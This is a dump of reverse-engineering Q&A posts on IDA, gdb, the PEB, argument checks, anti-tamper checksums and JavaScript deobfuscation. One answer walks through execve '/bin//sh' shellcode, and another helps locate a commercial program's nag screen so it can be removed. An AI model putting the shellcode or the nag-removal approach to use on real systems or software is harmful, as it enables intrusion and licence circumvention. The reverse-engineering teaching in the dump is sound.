0,
*(&amp;g_COREvidSurf + 25),
0,
16,
v75,
v77,
v79,
v81);
</code></pre>

<p>The struct used was selected from the standard struct selection in IDA, and if i press 'Y' on the declaration of BltFast in the struct declaration, the call is declared like this:</p>

<pre><code>HRESULT (__stdcall *BltFast)(IDirectDrawSurface7 *This, DWORD, DWORD, LPDIRECTDRAWSURFACE7, LPRECT, DWORD)
</code></pre>

<p>which is correct, but as seen above, IDA is still showing too many args.</p>
","<p>I would define a vtable struct which has the correct function pointers in it. I assume this is an <code>IDirectDrawSurfaceX</code>? The variable named <code>v17-&gt;lpVtbl</code> needs to have a type of  <code>IDirectDrawSurfaceX *</code>. Create this structure of function pointers according to the interface definition on MSDN or load it from a standard structures if IDA has imported the DirectX C interface definitions. Set the type of the <code>v17-&gt;lpVtbl</code> by pressing <kbd>y</kbd> on the definition of lpVtbl in whatever structure type <code>v17</code> is. Then you may need to force the type of the function pointer call to the type of the interface member used in the vtable. You do this by right clicking the call site and choosing <code>Force call type</code>.</p>
","5905"
"How to reverse command line arguments?","1832","","<p>I am working on a console windows executable. So far what I figured out is that the executable checks number of command line arguments. Afterwards, it branches out depending on the number of arguments passed (argv). The jumps are looked up using some sorts of jump table, which is constructed dynamically. It seems to be a daunting task try to figure out all of the possible command line arguments. It looks like the binary only executes only when certain number of particular arguments is parsed. I have collected some possible options using <code>strings</code> utility. </p>

<p>Is there a general road map for reversing command line arguments? What are possible approaches to reversing them? Are there any tools that could be employed?</p>
","<p>if you determined the argv and argc and values in there you gone half of the way . from value of argc you can understand how many arguments you should pass and from values in argv you can determine what you ""should"" pass.</p>

<p>i wrote a very simple example for you</p>

<pre><code>70 _main           proc near               ; CODE XREF: _main_0j
.text:00401070
.text:00401070 var_44          = byte ptr -44h
.text:00401070 var_4           = dword ptr -4
.text:00401070 arg_0           = dword ptr  8
.text:00401070 arg_4           = dword ptr  0Ch
.text:00401070
.text:00401070                 push    ebp
.text:00401071                 mov     ebp, esp
.text:00401073                 sub     esp, 44h
.text:00401076                 push    ebx
.text:00401077                 push    esi
.text:00401078                 push    edi
.text:00401079                 lea     edi, [ebp+var_44]
.text:0040107C                 mov     ecx, 11h
.text:00401081                 mov     eax, 0CCCCCCCCh
.text:00401086                 rep stosd
.text:00401088                 cmp     [ebp+arg_0], 2
.text:0040108C                 jge     short loc_4010A0
.text:0040108E                 push    offset aCheckUsage ; ""check usage""
.text:00401093                 call    _printf
.text:00401098                 add     esp, 4
.text:0040109B                 or      eax, 0FFFFFFFFh
.text:0040109E                 jmp     short loc_4010DB
</code></pre>

<p>as you can see there is <code>cmp  [ebp+arg_0], 2</code> it means at least we have to pass one ""argument"" then there is jqe (jump if greater or equal) .</p>

<p>so we will call program with one argument to pass this condition so we will be in <code>loc_4010A0</code> and here is the code .</p>

<pre><code>0 loc_4010A0:                             ; CODE XREF: _main+1Cj
.text:004010A0                 push    offset Str2     ; ""n00b""
.text:004010A5                 mov     eax, [ebp+arg_4]
.text:004010A8                 mov     ecx, [eax+4]
.text:004010AB                 push    ecx             
.text:004010AC                 call    _strcmp         
.text:004010B1                 add     esp, 8          
.text:004010B4                 mov     [ebp+var_4], eax
.text:004010B7                 cmp     [ebp+var_4], 0  
.text:004010BB                 jle     short loc_4010CC
.text:004010BD                 push    offset aWrongPassword ; ""wrong password !!!""
.text:004010C2                 call    _printf        
.text:004010C7                 add     esp, 4          
.text:004010CA                 jmp     short loc_4010D9 
</code></pre>

<p>now as you can see we have another compare here this time using strcmp and before that we will push our str and <code>arg_4</code> and here is our actual argument vector . </p>

<p>you can really easily analysis arguments using static and dynamic analysis but there is a few notes you have to keep in your mind .</p>

<ol>
<li>how many arguments we have to pass</li>
<li>type of arguments</li>
<li>location of arguments (argv)</li>
</ol>

<p>also there is additional note here , sometime maybe we ""DO NOT"" use argc/argv for getting command line arguments we can use windows API like <code>GetCommandLine</code> and so on too. you have to check how arguments are received and parsed too.</p>
","2300"
"Making operand an offset in IDA Python","1829","","<p>I working with ARM executable.
Sometimes I have something like this MOV instruction</p>

<pre><code>MOV R0, #0xCD548A40
</code></pre>

<p>where the number <code>#0xCD548A40</code> is a valid offset but IDA doesn't recognize it as such automatically.
I tried to reanalyze the executable with enabled option ""Automatically convert data to offsets"" without of any suitable result.
I also tried to write IDAPython script to fix this, but the only possibility of conversion to offset that I found was </p>

<pre><code>idaapi.jumpto(address)
idaapi.process_ui_action(""OpOffset"", 0)
</code></pre>

<p>Which is not too much convenient to use.</p>

<p><strong>Question:</strong></p>

<p>Given an instruction at specific address and one of its operands in a valid offset range is it possible to convert such numbers to offsets using IDA Python ?
Which IDAPython API should I use for it ?</p>
","<p>I've been using the Ida <code>OpOff</code> function for that. That was <code>idc</code>, not <code>idapython</code>, but <a href=""https://www.hex-rays.com/products/ida/support/idapython_docs/idc-module.html#OpOff"" rel=""nofollow"">https://www.hex-rays.com/products/ida/support/idapython_docs/idc-module.html#OpOff</a> says there's <code>OpOff</code> in <code>idapython</code> as well. In addition, there's another function, <code>OpOffEx</code>, that lets you specify more details. I think one of those is what you need.</p>
","6385"
"Dump TEB/PEB in immunitydbg","1814","","<p>I am trying to learn actually how to get to the PEB inside of TEB. I have tried this with <code>windbg</code> but could not manage to dump the PEB with stuff like:</p>

<pre><code>!peb
</code></pre>

<p>or </p>

<pre><code>dt nt!_PEB_LDR_DATA
</code></pre>

<p>And others. But, I could not manage to get the PEB dumped. So also my favorite debugger is still <code>immunitydbg</code>. So, I was trying to get to the information using <code>immunitydbg</code> CLI. But the nearest thing I have managed to get to PEB is dumping the TEB.</p>

<pre><code>d fs:[0]
</code></pre>

<p>So, I there anyhow someway inside of immunity do get the contents of TEB/PEB? I also tried to use the <code>Ollysdbg</code> PE Dump plugin but that only gave me another exe file with different contents. And also i am not sure if the PE Plugin does the right thing for me. </p>
","<p>Open the Memory Map window in OllyDbg/ImmunityDbg, scroll down to the bottom, and double click on the entry that contains <code>Process Environment Block</code>. This will open a dump of the PEB in OllyDbg/ImmunityDbg:</p>

<p><img src=""https://i.stack.imgur.com/VzPsD.png"" alt=""PEB""></p>
","4396"
"Get used jQuery plugins from website","1807","","<p>I want to know what jQuery plugins Facebook uses for their special scrollbar, like the two on the left, not the normal one on the right:</p>

<p><img src=""https://i.stack.imgur.com/odVcU.png"" alt=""enter image description here""></p>

<p>(<a href=""http://www.pcworld.com/article/240475/two_important_facebook_hover_tricks.html"" rel=""nofollow noreferrer"">source</a>)</p>

<p>Generally, how should I go when I want to know what jQuery plugin [website X] uses for [behaviour Y]?</p>
","<p>Both Firefox and Chrome have useful debugging tools to help you find out more information about scripts relating to a behavior. I'll be explaining mostly in Chrome as their default debug tools are more extensive</p>

<p>As a start, you can usually use <code>Right Click-&gt;Inspect Element</code> to find out information about an element quickly. However this does not appear to work on Facebook's ticker - doing so will select the ""Ticker News"" behind the scrollbar like this:</p>

<p><img src=""https://i.stack.imgur.com/Iq3Vy.png"" alt=""inspect fail""></p>

<p>Because we cannot see the element being modified, we will have to make some guesses. The ticker stories themselves do not appear to have anything related to the scrollbars. After traveling up to the parent and folding <code>&lt;div class=""tickerActivityStories""&gt;</code>, we can start to see things clearly</p>

<p>By hovering over (and invoking the scrollbars's ""appear"" code) we can observe the page's DOM and note the differences.</p>

<p><img src=""https://i.stack.imgur.com/2lWVK.png"" alt=""comparison""></p>

<p>So it appears that <code>&lt;div class=""uiScrollableAreaTrack""&gt;</code> as it responds accordingly whenever the mouse enters/leaves. The name also makes sense (implies that it's the scrollbar's tracks). By unfolding that <code>div</code>, we'll notice that there is even a ""gripper"" for the scrollbar!</p>

<p><img src=""https://i.stack.imgur.com/gAaV3.png"" alt=""gripper""></p>

<p>To find out what Javascript is involved with the scrollbars, click on <code>&lt;div class=""uiScrollableAreaGripper""</code>, and on the right pane, unfold the <code>Event Listeners</code> tab. We can assume that it responds to focus, and under the <code>Focus</code> section, you'll notice a few references to Javascript files. Hover over the filenames and Chrome will show you the link of the Javascript files. </p>

<p><img src=""https://i.stack.imgur.com/5WKL1.png"" alt=""listeners""></p>

<p>If you're in luck, the files may have a recognizable name (such as <code>typeahead.min.js</code> or similar, which you can google). Unfortunately in most cases, including ours, we are likely looking at proprietary code or minified code. (Minified code is extremely common to reduce file sizes so that pages load faster)</p>
","131"
"IDA Pro: What does ""Create EXE file..."" option do?","1801","","<p>I have come across <code>File -&gt; Create EXE file...</code> option in IDA. I thought one couldn't use IDA for patching. I have tried playing with it. However, it gives me the following error: <strong><code>This type of output files is not supported.</code></strong></p>

<p>What is this option for? What is possible usage of it?</p>
","<p>This option has limited value.</p>

<hr>

<blockquote>
  <p>IDA produces executable files only for: </p>
  
  <ul>
  <li>MS DOS .exe</li>
  <li>MS DOS .com</li>
  <li>MS DOS .drv</li>
  <li>MS DOS .sys</li>
  <li>general binary</li>
  <li>Intel Hex Object Format</li>
  <li>MOS Technology Hex Object Format</li>
  </ul>
  
  <p>-- <em>IDA Help file</em></p>
</blockquote>

<hr>

<blockquote>
  <p>While this is the most promising menu option, it unfortunately is also the most crippled. In a nutshell, it doesn't work for most file types...</p>
  
  <p>-- <em><a href=""http://nostarch.com/idapro.htm"">The IDA Pro Book</a>, Chapter 14</em></p>
</blockquote>

<p>That chapter goes into more detail why this option is not very useful. For starters, IDA doesn't parse and save contents of sections such as <code>.rsrc</code>, and doesn't have a way to rebuild import/export tables back into their original format.</p>

<p>Read this book. Not just for this question, it's a good and useful read.</p>
","2316"
"Breakpoint to debug Android Native Shared Library","1799","","<p>I'm trying to solve FLARE-on 2015 challenge #06 (<a href=""http://www.flare-on.com/files/2015_FLAREOn_Challenges.zip"" rel=""nofollow"">http://www.flare-on.com/files/2015_FLAREOn_Challenges.zip</a>) using a dynamic analysis approach. It's an Android APK that loads a shared library (libvalidate.so). I have been able to break where this library is loaded but then, it seems that I'm not able to set other breakpoints within this library, which is critical to solve this challenge.</p>

<p>Here is what I've been able to do so far:</p>

<p>*Started the FLAREON android application (<code>PID: 1278</code>) on my Android Virtual Device (AVD) and entered a wrong password to force libvalidate.so to appear in the loaded shared libraries</p>

<p>*Port forwarding:</p>

<pre><code>mobisec $ adb forward tcp:1234 tcp:1234
mobisec $ adb shell
avd # cd /data/
avd # ./gdbserver :1234 --attach 1278
Attached; pid = 1278
Listening on port 1234
</code></pre>

<p>*On Mobisec, in another terminal:</p>

<pre><code>mobisec # cd /opt/mobisec/Android/ndk/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin/
mobisec # ./arm-linux-androideabi-gdb
(gdb) target remote :1234
Remote debugging using :1234
0xb6eca5cc in ?? ()
(gdb) set solib-search-path /data/flareon/system_lib/
[...removed...]
Reading symbols from /data/flareon/system_lib/libvalidate.so...(no debugging symbols found)...done.
Loaded symbols for /data/flareon/system_lib/libvalidate.so
[...removed...]

(gdb) info sharedlibrary 
Error reading attached process's symbol file.
com.flare_on.flare: No such file or directory.
From        To          Syms Read   Shared Object Library
[...removed...]
0xab137e20  0xab139038  Yes (*)     /data/flareon/system_lib/libvalidate.so
(gdb) 
(gdb) x/50i 0xab137e20
   0xab137e20:  ldr     r0, [pc, #4]    ; 0xab137e2c
   0xab137e24:  add     r0, pc, r0
   0xab137e28:  b       0xab137da8
   0xab137e2c:  ldrdeq  r4, [r0], -r4   ; &lt;UNPREDICTABLE&gt;
   0xab137e30:  cmp     r0, #0
   0xab137e34:  push    {r3, lr}
   0xab137e38:  popeq   {r3, pc}
   0xab137e3c:  blx     r0
   0xab137e40:  pop     {r3, pc}
   0xab137e44:  mov     r1, r0
   0xab137e48:  ldr     r2, [pc, #12]   ; 0xab137e5c
   0xab137e4c:  ldr     r0, [pc, #12]   ; 0xab137e60
   0xab137e50:  add     r2, pc, r2
   0xab137e54:  add     r0, pc, r0
   0xab137e58:  b       0xab137d9c
   0xab137e5c:  andeq   r4, r0, r8, lsr #3
   0xab137e60:                  ; &lt;UNDEFINED&gt; instruction: 0xffffffd4
   0xab137e64 &lt;Java_com_flareon_flare_ValidateActivity_validate&gt;:       push    {r4, r5, r6, r7, lr}
   0xab137e66 &lt;Java_com_flareon_flare_ValidateActivity_validate+2&gt;:
    ldr r4, [pc, #320]  ; (0xab137fa8 &lt;Java_com_flareon_flare_ValidateActivity_validate+324&gt;)
   0xab137e68 &lt;Java_com_flareon_flare_ValidateActivity_validate+4&gt;:     adds    r5, r0, #0
   0xab137e6a &lt;Java_com_flareon_flare_ValidateActivity_validate+6&gt;:     movs    r1, #0
   0xab137e6c &lt;Java_com_flareon_flare_ValidateActivity_validate+8&gt;:     add     sp, r4
   0xab137e6e &lt;Java_com_flareon_flare_ValidateActivity_validate+10&gt;:    str     r2, [sp, #8]
   0xab137e70 &lt;Java_com_flareon_flare_ValidateActivity_validate+12&gt;:    add     r0, sp, #120    ; 0x78
   0xab137e72 &lt;Java_com_flareon_flare_ValidateActivity_validate+14&gt;:
[...removed...]
(gdb) b Java_com_flareon_flare_ValidateActivity_validate
Breakpoint 1 at 0xab137e74
(gdb) c
Continuing.
</code></pre>

<p>At this stage, the android application runs in my emulator and I'm able to provide a string in the text field. When I click on the ""Validate"" button, the application freezes because the BP is reached:</p>

<pre><code>Breakpoint 1, 0xab137e74 in Java_com_flareon_flare_ValidateActivity_validate () from /data/flareon/system_lib/libvalidate.so
</code></pre>

<p>But from here, I haven't found how I can continue to debug because all of my attempts fail:</p>

<pre><code>(gdb) x/10i $pc
=&gt; 0xab137e74 &lt;Java_com_flareon_flare_ValidateActivity_validate+16&gt;:    bl      0xab138f08
   0xab137e78 &lt;Java_com_flareon_flare_ValidateActivity_validate+20&gt;:
    ldr r1, [pc, #308]  ; (0xab137fb0 &lt;Java_com_flareon_flare_ValidateActivity_validate+332&gt;)
   0xab137e7a &lt;Java_com_flareon_flare_ValidateActivity_validate+22&gt;:    movs    r2, #92 ; 0x5c
   0xab137e7c &lt;Java_com_flareon_flare_ValidateActivity_validate+24&gt;:    add     r0, sp, #28
   0xab137e7e &lt;Java_com_flareon_flare_ValidateActivity_validate+26&gt;:    add     r1, pc
   0xab137e80 &lt;Java_com_flareon_flare_ValidateActivity_validate+28&gt;:    bl      0xab138f18
   0xab137e84 &lt;Java_com_flareon_flare_ValidateActivity_validate+32&gt;:    ldr     r1, [r5, #0]
   0xab137e86 &lt;Java_com_flareon_flare_ValidateActivity_validate+34&gt;:    movs    r3, #169        ; 0xa9
   0xab137e88 &lt;Java_com_flareon_flare_ValidateActivity_validate+36&gt;:    lsls    r3, r3, #2
   0xab137e8a &lt;Java_com_flareon_flare_ValidateActivity_validate+38&gt;:    ldr     r3, [r1, r3]
(gdb) step
Single stepping until exit from function Java_com_flareon_flare_ValidateActivity_validate,
which has no line number information.
</code></pre>

<p>Can you please help? Many thanks in advance for your feedback.</p>

<p>Post comment edit:</p>

<p>Thank you for the clarifications regarding the <code>step</code> (step out) vs <code>si</code> (step in) commands, very useful indeed. Maybe the initial post was lacking from clarity. What I would like to do is actually create another breakpoint later in the code but it seems to fail, as depicted below:</p>

<pre><code>(gdb) b Java_com_flareon_flare_ValidateActivity_validate
Breakpoint 1 at 0xab143e74
(gdb) c
Continuing.

Breakpoint 1, 0xab143e74 in Java_com_flareon_flare_ValidateActivity_validate () from /data/flareon/system_lib/libvalidate.so
(gdb) x/20i $pc
=&gt; 0xab143e74 &lt;Java_com_flareon_flare_ValidateActivity_validate+16&gt;:    bl      0xab144f08
   0xab143e78 &lt;Java_com_flareon_flare_ValidateActivity_validate+20&gt;:
    ldr r1, [pc, #308]  ; (0xab143fb0 &lt;Java_com_flareon_flare_ValidateActivity_validate+332&gt;)
   0xab143e7a &lt;Java_com_flareon_flare_ValidateActivity_validate+22&gt;:    movs    r2, #92 ; 0x5c
   0xab143e7c &lt;Java_com_flareon_flare_ValidateActivity_validate+24&gt;:    add     r0, sp, #28
   0xab143e7e &lt;Java_com_flareon_flare_ValidateActivity_validate+26&gt;:    add     r1, pc
   0xab143e80 &lt;Java_com_flareon_flare_ValidateActivity_validate+28&gt;:    bl      0xab144f18
   0xab143e84 &lt;Java_com_flareon_flare_ValidateActivity_validate+32&gt;:    ldr     r1, [r5, #0]
   0xab143e86 &lt;Java_com_flareon_flare_ValidateActivity_validate+34&gt;:    movs    r3, #169        ; 0xa9
   0xab143e88 &lt;Java_com_flareon_flare_ValidateActivity_validate+36&gt;:    lsls    r3, r3, #2
   0xab143e8a &lt;Java_com_flareon_flare_ValidateActivity_validate+38&gt;:    ldr     r3, [r1, r3]
   0xab143e8c &lt;Java_com_flareon_flare_ValidateActivity_validate+40&gt;:    adds    r0, r5, #0
   0xab143e8e &lt;Java_com_flareon_flare_ValidateActivity_validate+42&gt;:    ldr     r1, [sp, #8]
   0xab143e90 &lt;Java_com_flareon_flare_ValidateActivity_validate+44&gt;:    movs    r2, #0
   0xab143e92 &lt;Java_com_flareon_flare_ValidateActivity_validate+46&gt;:    blx     r3
   0xab143e94 &lt;Java_com_flareon_flare_ValidateActivity_validate+48&gt;:    subs    r6, r0, #0
   0xab143e96 &lt;Java_com_flareon_flare_ValidateActivity_validate+50&gt;:
    beq.n       0xab143eac &lt;Java_com_flareon_flare_ValidateActivity_validate+72&gt;
   0xab143e98 &lt;Java_com_flareon_flare_ValidateActivity_validate+52&gt;:    bl      0xab144f28
   0xab143e9c &lt;Java_com_flareon_flare_ValidateActivity_validate+56&gt;:    cmp     r0, #46 ; 0x2e
   0xab143e9e &lt;Java_com_flareon_flare_ValidateActivity_validate+58&gt;:
    bhi.n       0xab143eac &lt;Java_com_flareon_flare_ValidateActivity_validate+72&gt;
   0xab143ea0 &lt;Java_com_flareon_flare_ValidateActivity_validate+60&gt;:    movs    r2, #0
(gdb) b 0xab143e80
Function ""0xab143e80"" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 2 (0xab143e80) pending.
</code></pre>

<p>As you can see, when I try to set a second BP at <code>0xab143e80</code>, it says the function is not defined. Even if I force the creation of this BP, it is never reached.</p>

<p>My question is: once I am at the 1st breakpoint, how can I set another breakpoint (say for example at <code>0xab143e80</code>)?</p>
","<h2>Answer to your first question</h2>

<p><a href=""https://www.google.com/webhp?q=gdb%20step"" rel=""nofollow"">Googling for <code>gdb step</code></a> yields <a href=""https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html"" rel=""nofollow"">https://sourceware.org/gdb/onlinedocs/gdb/Continuing-and-Stepping.html</a> as the first result. From that page:</p>

<blockquote>
  <p><em>Warning:</em> If you use the <code>step</code> command while control is within a
  function that was compiled without debugging information, execution
  proceeds until control reaches a function that does have debugging
  information. Likewise, it will not step into a function which is
  compiled without debugging information. To step through functions
  without debugging information, use the <code>stepi</code> command, described below.</p>
</blockquote>

<p>Since the binary likely wasn't compiled with debugging information, you need to use <code>stepi</code> instead of <code>step</code>, as @guntram-blohm suggested in his comment above.</p>

<h2>Answer to your second question</h2>

<p><code>b 0xab143e80</code> is not the correct syntax to set a breakpoint on an address; <a href=""https://sourceware.org/gdb/onlinedocs/gdb/Specify-Location.html"" rel=""nofollow"">you need to use <code>b *0xab143e80</code></a>.</p>

<p>Please refer to <a href=""https://sourceware.org/gdb/onlinedocs/gdb/"" rel=""nofollow"">https://sourceware.org/gdb/onlinedocs/gdb/</a> for further questions on <code>gdb</code> usage and command syntax.</p>
","11050"
"Methods of discovering the location of nag/pop-up screens besides string search?","1794","","<p>I would like to remove a nag screen from a popular program. To do this I need to make sure the screen never gets called. So, the first task is to find the actual location of the nag (where it is called from). None of the strings in the nag screen seemed to show up in Ollydbg's string search. The only thing I managed to find on my own was the window of the nag in OllyDBG's window references, but I'm not sure if it was very useful.</p>

<p>What methods are commonly used to find the call locations of nag screens? If you guys set me on the right path, I'm sure I can figure out the rest on my own. :)</p>

<p>Some extra info: the program seems to have been developed in .Net, the title of the nag showed up in the window reference list of OllyDBG but I couldn't find it in the string search.</p>

<p>Second edit: I don't think it's .net. I tried doing ´tasklist /m ""mscor*""´, but it didn't show up (which it probably should have, if it's .net)</p>
","<p><strong><em>EDIT:</strong> The OP updated his question yesterday to say that he's dealing with a .NET application, so the advice below no longer applies. I'll leave this answer here though since it might help others for Win32 applications.</em></p>

<p>Try setting breakpoints on API functions that might be used to create the nag screen.</p>

<p>For example, (from <a href=""http://www.woodmann.com/krobar/beginner/p03_8.html"" rel=""nofollow"">http://www.woodmann.com/krobar/beginner/p03_8.html</a>):</p>

<ul>
<li><code>CreateWindow()</code></li>
<li><code>CreateWindowEx()</code></li>
<li><code>ShowWindow()</code></li>
<li><code>UpdateWindow()</code></li>
<li>etc.</li>
</ul>
","9008"
"Assembly- Using push and ESP-Register to store addresses","1791","","<p>I have found the following assembly lines presented in a tutorial which I do not understand:</p>

<pre><code> xor eax, eax      =&gt; clear, I know that, it makes eax = 0
 push eax          =&gt; push 0 on the stack
 push 0x68732f2f   =&gt; push ""//sh"" to the stack (the numbers are opcodes I guess, output of hexdump)
 push 0x6e69622f   =&gt; push ""/bin"" to the stack (again opcodes, representing ""/bin"" )
 mov ebx, esp      =&gt; put address of ""/bin//sh\0"" into ebx, via esp
 ....
</code></pre>

<p><strong>My question:</strong> 
Why we put address of ""/bin//sh"" into ebx, via esp using the line mov ebx, esp for that ?</p>

<p>I draw a sketch:</p>

<pre><code>         |                        |
         |------------------------|&lt;-----ESP (I know that ESP always points to the top)
(a)      |  0x6e69622f  (""//sh"")  |
         |------------------------|
(b)      |   0x68732f2f (""/bin"")  |
         |------------------------|
(c)      |       0                |
         |------------------------|
</code></pre>

<p><strong>How I try to explain it to myself</strong>(I am not sure if it is correct, but I thought to think about a little bit before I ask in that forum here):</p>

<p>ESP is a 32-bit register such that it is large enough to comprise the addresses at (a), (b) and (c) (which I marked above).</p>

<p>Is that right? I hope somebody can help me?</p>

<p>best regards, </p>
","<p>First of all, let me clarify this:</p>

<p><code>ESP</code> is a 32-bit register which contains a pointer to the stack.
It is not, by any means, big enough to <code>comprise the addresses at [...]</code>. It is just <em>pointing</em> at a memory location which holds <code>a</code>, <code>b</code>, and <code>c</code>.</p>

<hr>

<p>What your exploit does is push a string to the stack. Look at the <code>/bin//sh</code> hexadecimal representation:</p>

<pre><code>2f 62 69 6e 2f 2f 73 68
</code></pre>

<p>And now look at your assembly:</p>

<pre><code>push 0x68732f2f
push 0x6e69622f
</code></pre>

<p>This is <em>not</em> any kind of opcodes, but rather the ASCII representation of the string, pushed as double words (basically, pushes the string in less instructions)</p>

<p>An alternative way would be:</p>

<pre><code>push '/' ; same as push 0x2f
push 'b' ; same as push 0x62
push 'i' ; same as push 0x69
push 'n' ; same as push 0x6e
push '/' ; same as push 0x2f
push '/' ; same as push 0x2f
push 's' ; same as push 0x73
push 'h' ; same as push 0x68
</code></pre>

<p>Basically, it's doing the same as above, just in less instructions, by combining the ASCII codes together: <code>6e69622f</code> instead of <code>2f</code>, <code>62</code>, <code>69</code>, <code>6e</code> separated. It's also pushing a <code>0</code>, which is a <a href=""http://en.wikipedia.org/wiki/Null-terminated_string"" rel=""noreferrer"">terminator for a C-style string</a>, so that the string ends there.</p>

<p>Now, the stack has <code>/bin//sh</code>, and all you gotta do is <a href=""http://www.cs.dartmouth.edu/~sergey/cs108/examples/shellcode32-1.c"" rel=""noreferrer"">call <code>sys_execve</code></a>, by doing an <code>int 0x80</code> (interrupt), which is the way Linux uses to make syscalls.</p>

<p>Since <a href=""http://asm.sourceforge.net/syscall.html"" rel=""noreferrer"">the syscall ID for <code>sys_execve</code> is 11</a>, you move <code>11</code> to <code>al</code> (lower part of <code>eax</code>), and put the first argument into <code>ebx</code>, which is a <em>pointer to a string</em>. And since <code>ESP</code> is pointing to the top of the stack, and the top of the stack contains the <code>/bin//sh</code> we pushed before, the exploit assembly means this:</p>

<pre><code>sys_execve(""/bin//sh"");
</code></pre>

<p>There you go, exploited! :)</p>
","8242"
"What ways is there for an application to detect that it has been modified?","1788","","<p>I am using ollydbg and a Hex editor. I confirmed that once the application is edited in any way it behaves different than normal.</p>

<p>My first thought was that the file is checking the checksum value so I looked at the intermodular calls in olly and did not see anything about checksum. I was specifically looking for <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms680355%28v=vs.85%29.aspx"" rel=""nofollow"">MapFileAndCheckSum</a></p>

<p>But I am trying to reason this out, I am thinking that a checksum value has to be hard coded in the file so it can be compared to the actual checksum. So I am wondering from the developers point of view how is it possible to get the checksum value to be hard code when the application is not complete/compiled</p>

<p>Which brings me to the question. What ways is there for an application to detect that it has been modified?</p>

<p>------- EDIT ------- Additional Information ------</p>

<p>I have been doing some testing and I have to say I'm baffled as to where the checksum value is being stored.</p>

<ol>
<li>There are no connections to the internet.</li>
<li>Only one dll comes with the application (I extracted the installer files manually) the dll file is old and was last modified prior to the application. I even compared it to an earlier version of the application that did not have this checksum check and the dll is identical.</li>
<li>I taught that maybe the checksum value would be entered in the registry by the installer so I extracted the .exe and .dll to a separate computer that has never used the installer. Changes are still being detected!</li>
<li>It is definitely a checksum test, as I have changed a single byte of padding by from 00 to 20 and the change is detected. If I edit back to 00 to application performs normally.</li>
</ol>

<p>So now I am wondering would it be possible to calculate what the checksum is going to be before entering the hard coded checksum value? I do realize that the actual checksum value will change when changing the hard coded checksum value. I want to know if there is any method to predetermine a checksum value when hard coding and finding a match. Seems impossible but I cannot think of any other means considering the situation.</p>
","<p>The application can check only a part of itself, excluding the checksum part. You can also have a runtime decryption, that will be wrongly decrypted if tampered with. There are <a href=""http://libeccio.dia.unisa.it/wlf/"" rel=""nofollow"">several</a> <a href=""http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.105.9337&amp;rep=rep1&amp;type=pdf"" rel=""nofollow"">research</a> <a href=""http://www.seas.gwu.edu/~simha/research/spee_journal.pdf"" rel=""nofollow"">projects</a> in this area.</p>
","3659"
"Deobfuscating a javascript file","1785","","<p>I am having a obfuscated JS file and I want to deobfuscate it (and <em>not beautify it</em>). I have seen answer to a <a href=""https://reverseengineering.stackexchange.com/questions/1436/analyzing-highly-obfuscated-javascript"">similar question here</a> and I tried de-obfuscating a the file using online version of JSUnpack and JSDetox. However, I am still not able to deobfuscate it. The JS file is not a malware but it is used to inject ads into web-page. So, any analyser analysing the file won't find anything malicious. The problem is that the JS stores (hex) strings in string array and using it to concatenate the code. JSDetox atleast decodes the string array in the beginning of the file. However, the readability is not improved anyway as the whole code makes use of the string array. If anyone wants to take a look at the file they can find it <a href=""http://pastebin.com/vYSVe4KX"" rel=""nofollow noreferrer"">here</a>.</p>

<p>Any kind of help would be appreciated! Thanks.</p>

<p><strong>Edit:</strong> I have also tried Malzilla now because I found a similar technique <a href=""https://reverseengineering.stackexchange.com/questions/2103/try-to-deobfuscate-multi-layered-javascript?rq=1"">here</a>. However, the script probably has some errors which is tolerated by Chrome. However, when I click ""Run Script"" in Malzilla, I get a message saying ""Script cannot be compiled"". I tried to debug script using the ""Debug Script"" button, the window highlights some line saying ""InterYeildOptions is not defined"" and I don't know what to do about it. :-/</p>
","<p>Well, so, you can use <a href=""http://jsbeautifier.org/"" rel=""nofollow"">http://jsbeautifier.org/</a> with unescape printable chars to get the top var decoded, then, if you look closely, you should see  that the values of the var are used everywhere with an index, so you can just write a quick script to replace it with the actual value. End result is <a href=""http://pastebin.com/iJqs6Jq3"" rel=""nofollow"">here</a></p>

<p>Python to replace the var:</p>

<pre><code>#Replace.py //probably not optimized, so dont be too harsh on me
_0x4b6a=[copy-pasteValueDecodedFromScript]
with open('EncodedScript.js') as fp:
    for line in fp:
        for i in range(0,608):
            line = line.replace(""_0x4b6a[""+str(i)+""]"", _0x4b6a[i])      
        print line
</code></pre>
","6336"
"Opening mono droid .so files in .NET decompiler","1778","","<p>What is the format for .so native android files developed in Xamarin Mono droid? From this SO <a href=""https://stackoverflow.com/questions/19072897/xamarin-android-does-native-code-compilation-make-reverse-engineering-harder"">post</a> it appears they are actually .NET IL binaries (not native machine code). However, this other SO <a href=""https://reverseengineering.stackexchange.com/questions/4624/how-do-i-reverse-engineer-so-files-found-in-android-apks"">post</a> on Android NDK development appears to contradict this. In the apk file, there is a lib/armebi folder and a lib/x86 folder. Is it possible for .NET to be compiled to ARM format? If that is possible, it appears that x86 based .NET decompilers like ILSpy cannot handle ARM code too. Is there a better solution?</p>

<p>EDIT: I know Hopper and IDA Pro works with ARM mode, but we get assembly instead of .NET code.</p>
","<p>If you're looking at a ""normal"" mono droid application (compiled with something like Xamarin) then you'll see some of these structures in the APK/ZIP'</p>

<pre><code>/assemblies/Sikur.Monodroid.dll
/assemblies/Sikur.dll
/assemblies/Xamarin.Android.Support.v13.dll
/assemblies/Xamarin.Android.Support.v4.dll
/assemblies/Xamarin.Android.Support.v7.AppCompat.dll
/assemblies/Xamarin.Android.Support.v7.CardView.dll
/assemblies/Xamarin.Android.Support.v7.RecyclerView.dll
/assemblies/Xamarin.Mobile.dll
/assemblies/mscorlib.dll
/classes.dex
/lib
/lib/armeabi-v7a
/lib/armeabi-v7a/libmonodroid.so
/lib/armeabi-v7a/libmonosgen-2.0.so
</code></pre>

<p>File in the <code>assemblies</code> directory will be the Mono/.Net code and can be reversed using those normal tools.</p>

<p><code>classes.dex</code> is a normal Android Dalvik executable file (dex) which can be reversed using the usual tools (baksmali, IDA Pro, etc) - though it should just be the stub loaded to start the Mono engine.</p>

<p>The files includes in <code>lib/**/*.so</code> are native shared libraries which are compiled into an ELF ARM file. These are normally going to the the monodroid engine (<code>libmonodroid.so</code>) and potentially other plugins that have been used by the developer. These would require ELF ARM capable disassemblers like Hopper, IDA Pro, r2, etc.</p>

<p>In the specific example above, the only non-Xamarin code would be located in <code>Sikur.dll</code> and <code>Sikur.Monodroid.dll</code>.</p>
","11078"
